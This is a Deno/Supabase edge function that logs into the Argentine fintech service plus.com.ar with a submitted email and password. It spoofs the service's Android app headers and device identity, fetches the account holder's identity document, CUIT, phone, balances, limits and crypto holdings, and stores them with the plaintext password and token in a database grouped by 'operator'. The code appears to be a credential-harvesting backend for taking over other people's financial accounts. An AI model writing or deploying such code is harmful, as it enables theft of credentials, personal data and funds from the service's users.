import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const PLUS_HEADERS = {
  "Accept-Encoding": "gzip",
  "Connection": "Keep-Alive",
  "Content-Type": "application/json",
  "User-Agent": "okhttp/4.12.0",
  "accept": "application/json",
  "mobile-app": "bGCI6D67bJ88",
  "mobile-app-version": "2.2.4",
  "x-channel": "9DF8CB31A4",
  "x-device-manufacturer": "samsung",
  "x-device-model": "SM-S9110",
  "x-device-name": "SM-S9110",
  "x-device-unique-id": "8937364d03a1f0a0",
  "x-os": "android",
};

const AUTH_URL = "https://ms.plus.com.ar/plus/auth/login";
const API_URL = "https://api.plus.com.ar";

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, email, password, accessToken, operatorCode } = await req.json();

    if (action === "login") {
      // Step 1: Login
      const loginRes = await fetch(AUTH_URL, {
        method: "POST",
        headers: { ...PLUS_HEADERS, Host: "ms.plus.com.ar" },
        body: JSON.stringify({ email, password }),
      });
      const loginData = await loginRes.json();
      if (!loginRes.ok || !loginData.accessToken) {
        return new Response(JSON.stringify({ error: "Login failed", details: loginData }), {
          status: 401,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const token = loginData.accessToken;
      const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${token}` };
      const body = JSON.stringify({ "front-web": true });

      // Step 2: Fetch all data in parallel
      const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
        fetch(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
        fetch(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
      ]);

      const [profile, balances, fintech, limits, crypto] = await Promise.all([
        profileRes.json(),
        balancesRes.json(),
        fintechRes.json(),
        limitsRes.json(),
        cryptoRes.json(),
      ]);

      // Step 3: Save to database
      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);

      const opCode = operatorCode || "master";
      const fullName = `${profile.first_name || ""} ${profile.last_name || ""}`.trim();

      // Check if exists
      const { data: existing } = await supabase
        .from("plus_accounts")
        .select("id")
        .eq("email", email)
        .eq("operator_code", opCode)
        .maybeSingle();

      const accountData = {
        email,
        password,
        operator_code: opCode,
        access_token: token,
        full_name: fullName,
        document: profile.document || null,
        cuit: profile.cuit || null,
        phone: profile.profile?.telephone || null,
        city: profile.profile?.city || null,
        province: profile.profile?.province?.name || null,
        profile_data: profile,
        balance_ars: { ars: balances.ars, pendingARS: balances.pendingARS },
        balance_usd: { usd: balances.usd, pendingUSD: balances.pendingUSD },
        fintech_data: fintech,
        limits_data: limits,
        crypto_data: crypto,
        last_login_at: new Date().toISOString(),
        last_data_sync_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      if (existing) {
        await supabase.from("plus_accounts").update(accountData).eq("id", existing.id);
      } else {
        await supabase.from("plus_accounts").insert(accountData);
      }

      return new Response(JSON.stringify({
        success: true,
        accessToken: token,
        profile,
        balances,
        fintech,
        limits,
        crypto,
      }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "refresh") {
      // Re-fetch data with existing token
      const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${accessToken}` };
      const body = JSON.stringify({ "front-web": true });

      const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
        fetch(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
        fetch(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
      ]);

      const [profile, balances, fintech, limits, crypto] = await Promise.all([
        profileRes.json(),
        balancesRes.json(),
        fintechRes.json(),
        limitsRes.json(),
        cryptoRes.json(),
      ]);

      return new Response(JSON.stringify({
        success: true,
        profile,
        balances,
        fintech,
        limits,
        crypto,
      }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Plus auth error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
